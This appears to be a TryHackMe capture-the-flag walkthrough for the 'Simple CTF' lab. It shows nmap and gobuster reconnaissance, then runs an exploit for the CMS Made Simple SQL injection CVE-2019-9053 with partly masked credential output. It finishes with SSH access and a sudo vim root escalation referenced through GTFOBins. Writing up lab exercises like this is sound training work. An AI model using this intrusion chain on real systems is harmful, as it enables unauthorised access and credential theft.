![Screenshot 2023-08-20 224751.png](Simple_CTF%20434d9e130dc549059eec37b68aa59763/Screenshot 2023-08-20 161553.png)

# Simple_CTF

The skills to be tested and needed to solve this room are: **nmap**, **GoBuster**, **privilege escalation**, **Sudo**, **find**, and **gtfobins**.

This is a **free** room, which means anyone can deploy virtual machines in the room (without being subscribed)! Created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797)

You can access the room at [https://tryhackme.com/room/rootme](https://tryhackme.com/room/easyctf)

Target Machine IP address can change during the process.

## Footprinting and Reconnaissance

## Nmap Scan

nmap -A -Pn -T4 -oN nmap_result.txt 10.10.150.91

```bash
# Nmap 7.92 scan initiated Sat Aug 19 11:52:12 2023 as: nmap -A -Pn -T4 -oN nmap_result.txt 10.10.150.91
Nmap scan report for 10.10.150.91
Host is up (0.42s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.11.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   380.71 ms 10.17.0.1
2   ... 4
5   414.08 ms 10.10.150.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 19 11:53:33 2023 -- 1 IP address (1 host up) scanned in 81.82 seconds
```

After analyzing the nmap scan it look like their is total three port are open . and the ssh service is running in different port number 2222. 

## Run gobuster to look for hidden directories and files on the web server.

gobuster dir -u [http://10.10.172.154/](http://10.10.172.154/) -w /home/kali/Downloads/SecLists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_output.txt -t 20

![Screenshot 2023-08-20 225603.png](Simple_CTF%20434d9e130dc549059eec37b68aa59763/Screenshot_2023-08-20_225603.png)

We have found the hidden directorie called `/simple`

![Screenshot 2023-08-20 224751.png](Simple_CTF%20434d9e130dc549059eec37b68aa59763/Screenshot_2023-08-20_224751.png)

# **CMS Made Simple - CVE-2019-9053**

We find an SQL Injection vulnerability that affects this CMS, we use the exploit to obtain the username and password.

**[CMS Made Simple < 2.2.10 - SQL Injection](https://www.exploit-db.com/exploits/46635)**

To run the above exploit we have to Interpreted the exploit with python2 and install the necessary required module like termcolor 

```bash
ls /usr/bin/python*
sudo ln -sf /usr/bin/python2.7 /usr/bin/python			//to link the python version
```

```bash
Download the termcolor module source code from the PyPI website: https://pypi.org/project/termcolor/.
Unzip the file.
Change directory to the termcolor directory.
Run the following command to install the termcolor module:
python setup.py install
pip install --user termcolor==1.1.0
```

```bash
python CVE-2019-9053.py -u http://10.10.230.238/simple/ --crack -w 10k-most-common.txt
 
[+] Salt for password found: 1dac0d9***fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468b*****a84c7eb73846e8d96
[+] Password cracked: ******
```

We tried to use the credentials we found in the Made Simple panel but we failed to start session.

# **SSH - User**

We use the credentials that we find in the SSH service to obtain a shell and our flag **user.txt**.

![Screenshot 2023-08-20 230351.png](Simple_CTF%20434d9e130dc549059eec37b68aa59763/Screenshot_2023-08-20_230351.png)

# **PRIVILEGE ESCALATION**

We make a simple enumeration with `sudo -l`  to list the commands / files that we can execute without password and with root privileges, we see `/usr/bin/vim`, to get a shell we use **[GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#sudo)**.

![Screenshot 2023-08-20 230921.png](Simple_CTF%20434d9e130dc549059eec37b68aa59763/Screenshot_2023-08-20_230921.png)